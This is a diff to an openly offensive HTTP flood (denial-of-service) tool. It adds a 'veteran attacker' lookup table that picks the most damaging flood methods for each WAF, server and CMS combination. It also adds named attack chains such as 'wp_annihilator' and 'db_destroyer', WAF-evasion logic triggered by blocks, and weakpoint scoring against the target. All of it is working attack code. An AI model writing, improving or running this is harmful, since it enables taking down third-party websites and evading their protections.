@@ -2550,6 +2550,63 @@ class HttpFlood(Thread):
         "worst_method": None,     # Dynamically tracked worst performer
         "endpoints_discovered": [],  # Heavy endpoints found during multi-probe
         "burst_counter": 0,       # For burst/pause rhythm
+        "last_method": None,      # Previous method for anti-pattern
+        "last_3_methods": [],     # Sliding window of last 3 methods (anti-fingerprint)
+        "combo_queue": [],        # Pre-planned combo attack sequence
+        "emergency_evasion": False,  # Triggered when WAF is actively hunting us
+        "target_weakpoint": None,   # Discovered weak method that causes most damage
+        "efficiency_score": {},    # method -> (successes / total_attempts) ratio
+        "attack_start_time": 0,    # When the attack started (for time-based phases)
+    }
+    
+    # ========================================================================
+    #  EXPERIENCE DATABASE: Pre-coded knowledge from real-world attack patterns
+    #  Format: (waf, server, cms) -> {method: bonus_weight}
+    #  This is "muscle memory" - things a veteran attacker would know instantly
+    # ========================================================================
+    _EXPERIENCE_DB = {
+        # WordPress on Apache without WAF = XMLRPC is devastating
+        ("none", "apache", "wordpress"):      {"XMLRPC_AMP": 90, "WP_SEARCH": 80, "STRESS": 40},
+        ("none", "nginx", "wordpress"):       {"XMLRPC_AMP": 85, "WP_SEARCH": 75, "POST_DYN": 35},
+        ("none", "litespeed", "wordpress"):   {"WP_SEARCH": 70, "POST_DYN": 40, "DYN": 35},
+        # WordPress behind Cloudflare = Stealth + WP exploits
+        ("cloudflare", "nginx", "wordpress"): {"STEALTH_JA3": 80, "WP_SEARCH": 60, "XMLRPC_AMP": 50},
+        ("cloudflare", "apache", "wordpress"):{"STEALTH_JA3": 75, "WP_SEARCH": 55, "XMLRPC_AMP": 45},
+        # WordPress behind Wordfence = its own WAF is the weakness
+        ("wordfence", "apache", "wordpress"): {"WP_SEARCH": 90, "XMLRPC_AMP": 85, "POST_DYN": 40},
+        ("wordfence", "nginx", "wordpress"):  {"WP_SEARCH": 85, "XMLRPC_AMP": 80, "POST_DYN": 35},
+        # Naked servers (no CMS, no WAF) = brute force wins
+        ("none", "nginx", "custom"):          {"STRESS": 50, "PPS": 40, "GET": 35, "POST_DYN": 30},
+        ("none", "apache", "custom"):         {"STRESS": 45, "PPS": 35, "POST_DYN": 35},
+        ("none", "litespeed", "custom"):      {"POST_DYN": 40, "DYN": 35, "STRESS": 30},
+        ("none", "iis", "custom"):            {"SLOW_V2": 50, "STRESS": 40, "POST_DYN": 35},
+        # Akamai targets = only stealth works
+        ("akamai", "unknown", "custom"):      {"STEALTH_JA3": 90, "SLOW_V2": 40},
+        ("akamai", "nginx", "custom"):        {"STEALTH_JA3": 85, "SLOW_V2": 35, "POST_DYN": 20},
+        # Shopify = CDN-heavy, need to exhaust origin
+        ("cloudflare", "nginx", "shopify"):   {"STEALTH_JA3": 80, "SLOW_V2": 40, "POST_DYN": 25},
+        # Laravel apps = POST-heavy endpoints
+        ("none", "nginx", "laravel"):         {"POST_DYN": 60, "POST": 45, "DYN": 40},
+        ("cloudflare", "nginx", "laravel"):   {"STEALTH_JA3": 70, "POST_DYN": 45, "DYN": 30},
+        # Joomla targets
+        ("none", "apache", "joomla"):         {"POST_DYN": 50, "DYN": 45, "STRESS": 30},
+        # Drupal targets
+        ("none", "apache", "drupal"):         {"POST_DYN": 50, "DYN": 40, "POST": 35},
+    }
+    
+    # ========================================================================
+    #  COMBO CHAINS: Pre-planned multi-step attack sequences
+    #  Instead of random picks, execute coordinated multi-vector strikes
+    # ========================================================================
+    _COMBO_CHAINS = {
+        "stealth_burst":    ["STEALTH_JA3", "STEALTH_JA3", "POST_DYN", "DYN", "STEALTH_JA3"],
+        "wp_annihilator":   ["WP_SEARCH", "XMLRPC_AMP", "WP_SEARCH", "POST_DYN", "WP_SEARCH"],
+        "slow_siege":       ["SLOW_V2", "SLOW_V2", "SLOW_V2", "BOT", "SLOW_V2"],
+        "blitz_krieg":      ["STRESS", "PPS", "GET", "POST", "STRESS", "PPS"],
+        "polymorphic_wave": ["POST_DYN", "DYN", "STEALTH_JA3", "POST", "GET", "POST_DYN"],
+        "cookie_monster":   ["COOKIE", "STEALTH_JA3", "POST_DYN", "COOKIE", "DYN"],
+        "bot_swarm":        ["BOT", "GET", "BOT", "STEALTH_JA3", "BOT"],
+        "db_destroyer":     ["WP_SEARCH", "WP_SEARCH", "XMLRPC_AMP", "WP_SEARCH", "WP_SEARCH"],
     }
     
     def _chaos_recon(self):
@@ -2843,6 +2900,69 @@ class HttpFlood(Thread):
             if not intel["worst_method"] or (success_rate < 0.3 and len(recent) > 5):
                 intel["worst_method"] = method_name
         
+        # === STRATEGY H: Experience Database Lookup ===
+        # Check if we have pre-coded knowledge for this exact target profile
+        server = intel.get("server_type", "unknown")
+        experience_key = (waf, server, cms)
+        if experience_key in self._EXPERIENCE_DB:
+            exp_bonuses = self._EXPERIENCE_DB[experience_key]
+            for method_name, bonus in exp_bonuses.items():
+                weights[method_name] = max(weights.get(method_name, 0), bonus)
+            if int(REQUESTS_SENT) < 10:
+                print(f"{bcolors.OKGREEN}[CHAOS] Experience match found: {experience_key} -> Applying veteran tactics{bcolors.RESET}")
+        else:
+            # Try partial matches (waf, *, cms) or (*, server, cms)
+            for exp_key, exp_bonuses in self._EXPERIENCE_DB.items():
+                if exp_key[0] == waf and exp_key[2] == cms:
+                    for method_name, bonus in exp_bonuses.items():
+                        weights[method_name] = max(weights.get(method_name, 0), int(bonus * 0.7))
+                    break
+                    
+        # === STRATEGY I: Anti-Pattern Detection ===
+        # If WAF is catching our pattern (3+ consecutive blocks), trigger emergency evasion
+        if intel["consecutive_block"] >= 3:
+            intel["emergency_evasion"] = True
+            # Force a completely different method from last 3
+            last_3 = intel.get("last_3_methods", [])
+            for method_name in last_3:
+                if method_name in weights:
+                    weights[method_name] = 1  # Nearly zero out recently used methods
+            # Boost unused methods
+            for method_name in weights:
+                if method_name not in last_3 and weights[method_name] > 0:
+                    weights[method_name] = int(weights[method_name] * 1.5)
+        else:
+            intel["emergency_evasion"] = False
+            
+        # === STRATEGY J: Combo Chain Selection ===
+        # Every 10-15 executions, plan a coordinated combo instead of random picks
+        if not intel.get("combo_queue") and intel["total_executions"] % randint(10, 15) == 0:
+            # Select the best combo chain based on current intel
+            if cms == "wordpress":
+                intel["combo_queue"] = list(self._COMBO_CHAINS["wp_annihilator" if '/xmlrpc.php' in discovered else "db_destroyer"])
+            elif waf in ("cloudflare", "akamai", "ddosguard", "fastly"):
+                intel["combo_queue"] = list(self._COMBO_CHAINS["stealth_burst"])
+            elif waf in ("imperva",):
+                intel["combo_queue"] = list(self._COMBO_CHAINS["cookie_monster"])
+            elif waf == "none" and phase == "ASSAULT":
+                intel["combo_queue"] = list(self._COMBO_CHAINS["blitz_krieg"])
+            elif phase == "SUSTAIN":
+                intel["combo_queue"] = list(self._COMBO_CHAINS["slow_siege"])
+            else:
+                intel["combo_queue"] = list(self._COMBO_CHAINS["polymorphic_wave"])
+                
+        # === STRATEGY K: Efficiency Scoring ===
+        # Boost methods with best success/attempt ratios
+        for method_name, history_list in intel.get("success_history", {}).items():
+            if method_name in weights and len(history_list) >= 10:
+                recent = history_list[-20:]
+                efficiency = sum(recent) / len(recent)
+                intel["efficiency_score"][method_name] = efficiency
+                
+                # Find the weakpoint (highest efficiency method with high weight)
+                if efficiency > 0.8 and weights.get(method_name, 0) > 20:
+                    intel["target_weakpoint"] = method_name
+        
         # === FILTER: Remove unavailable methods ===
         if not HAS_TLS_CLIENT:
             weights["STEALTH_JA3"] = 0
@@ -2876,10 +2996,15 @@ class HttpFlood(Thread):
             intel["consecutive_5xx"] = max(intel["consecutive_5xx"] - 1, 0)
     
     def CHAOS(self):
-        """[V12] Deep Tactical AI Engine - Recon, Plan, Execute, Observe, Adapt.
-        A self-improving attack algorithm with military-grade phase transitions,
-        deep target fingerprinting, reinforcement learning, and real-time
-        battlefield adaptation across 11+ WAF profiles."""
+        """[V13] Veteran Tactical AI - Recon, Plan, Execute, Observe, Adapt.
+        Features experience database, combo attack chains, anti-pattern evasion,
+        efficiency scoring, and military-grade phase transitions."""
+        
+        intel = self._chaos_intel
+        
+        # Record attack start time
+        if intel["attack_start_time"] == 0:
+            intel["attack_start_time"] = time()
         
         # Phase 1: DEEP RECON (runs only once per target)
         self._chaos_recon()
@@ -2887,7 +3012,7 @@ class HttpFlood(Thread):
         # Phase 2: STRATEGIC PLAN (recalculated every call with live data)
         weights = self._chaos_plan()
         
-        # Phase 3: EXECUTE with burst control
+        # Phase 3: EXECUTE with intelligent method selection
         method_map = {
             "GET": self.GET, "POST": self.POST, "STRESS": self.STRESS,
             "PPS": self.PPS, "DYN": self.DYN, "POST_DYN": self.POST_DYN,
@@ -2897,37 +3022,71 @@ class HttpFlood(Thread):
         if HAS_TLS_CLIENT:
             method_map["STEALTH_JA3"] = self.STEALTH_JA3
         
-        active_pool = [(name, w) for name, w in weights.items() if w > 0 and name in method_map]
-        total_weight = sum(w for _, w in active_pool)
+        chosen_name = "GET"  # Fallback
         
-        if total_weight <= 0:
-            self.GET()
-            return
+        # === DECISION TREE ===
+        # Priority 1: Execute combo chain if one is queued
+        if intel.get("combo_queue"):
+            combo_method = intel["combo_queue"].pop(0)
+            if combo_method in method_map and weights.get(combo_method, 0) > 0:
+                chosen_name = combo_method
+            # If combo method is filtered out, skip it and use normal selection
+            else:
+                intel["combo_queue"] = []  # Abort invalid combo
+                
+        # Priority 2: Emergency evasion - pick least-used method
+        if chosen_name == "GET" and intel.get("emergency_evasion"):
+            # Find method with fewest total attempts
+            least_used = None
+            least_count = float('inf')
+            for name, w in weights.items():
+                if w > 0 and name in method_map:
+                    attempts = len(intel.get("success_history", {}).get(name, []))
+                    if attempts < least_count:
+                        least_count = attempts
+                        least_used = name
+            if least_used:
+                chosen_name = least_used
+                
+        # Priority 3: Exploit known weakpoint (20% of the time in ASSAULT+ phases)
+        if chosen_name == "GET" and intel.get("target_weakpoint") and intel["phase"] in ("ASSAULT", "FINISH"):
+            if randint(1, 5) <= 1:  # 20% chance to exploit weakpoint directly
+                wp = intel["target_weakpoint"]
+                if wp in method_map and weights.get(wp, 0) > 0:
+                    chosen_name = wp
+        
+        # Priority 4: Normal weighted roulette
+        if chosen_name == "GET":
+            active_pool = [(name, w) for name, w in weights.items() if w > 0 and name in method_map]
+            total_weight = sum(w for _, w in active_pool)
             
-        # Weighted roulette selection
-        r = randint(1, total_weight)
-        upto = 0
-        chosen_name = "GET"
-        for name, weight in active_pool:
-            if upto + weight >= r:
-                chosen_name = name
-                break
-            upto += weight
+            if total_weight > 0:
+                r = randint(1, total_weight)
+                upto = 0
+                for name, weight in active_pool:
+                    if upto + weight >= r:
+                        chosen_name = name
+                        break
+                    upto += weight
         
         chosen_func = method_map.get(chosen_name, self.GET)
         
-        # Burst rhythm: fire 3-5 rapid shots of the same method, then switch
-        # This simulates natural browsing patterns (humans click multiple pages)
-        intel = self._chaos_intel
+        # Update method tracking for anti-pattern
+        intel["last_method"] = chosen_name
+        if "last_3_methods" not in intel:
+            intel["last_3_methods"] = []
+        intel["last_3_methods"].append(chosen_name)
+        if len(intel["last_3_methods"]) > 3:
+            intel["last_3_methods"] = intel["last_3_methods"][-3:]
+        
         intel["burst_counter"] += 1
-        burst_size = randint(3, 6)
         
         # Track pre-execution state for observation
         pre_burned = len(BURNED_PROXIES)
         pre_errors = int(ERROR_COUNT)
         pre_requests = int(REQUESTS_SENT)
         
-        # Execute
+        # Execute the chosen attack vector
         try:
             chosen_func()
             
@@ -2938,15 +3097,29 @@ class HttpFlood(Thread):
             
             got_blocked = post_burned > pre_burned
             got_errors = post_errors > pre_errors + 2
-            got_5xx = False  # Inferred from no request increase + error increase
+            got_5xx = False
             if post_requests == pre_requests and post_errors > pre_errors:
                 got_5xx = True
             
-            # Phase 5: ADAPT
+            # Phase 5: ADAPT with reinforcement learning
             if got_blocked or got_errors:
                 self._chaos_learn(chosen_name, False, got_5xx)
             else:
                 self._chaos_learn(chosen_name, True, got_5xx)
+                
+            # Periodic status report (every 200 executions)
+            if intel["total_executions"] % 200 == 0 and intel["total_executions"] > 0:
+                elapsed = int(time() - intel["attack_start_time"])
+                print(f"")
+                print(f"{bcolors.OKCYAN}[CHAOS V13 STATUS] Phase: {intel['phase']} | Executed: {intel['total_executions']} | Time: {elapsed}s{bcolors.RESET}")
+                print(f"  Best Method : {bcolors.OKGREEN}{intel.get('best_method', 'N/A')}{bcolors.RESET}")
+                print(f"  Worst Method: {bcolors.FAIL}{intel.get('worst_method', 'N/A')}{bcolors.RESET}")
+                print(f"  Weakpoint   : {bcolors.WARNING}{intel.get('target_weakpoint', 'Searching...')}{bcolors.RESET}")
+                print(f"  Burned IPs  : {len(BURNED_PROXIES)}")
+                eff_str = " | ".join([f"{k}:{v:.0%}" for k, v in sorted(intel.get("efficiency_score", {}).items(), key=lambda x: -x[1])[:5]])
+                if eff_str:
+                    print(f"  Efficiency  : {eff_str}")
+                print(f"")
                 
         except Exception:
             self._chaos_learn(chosen_name, False)
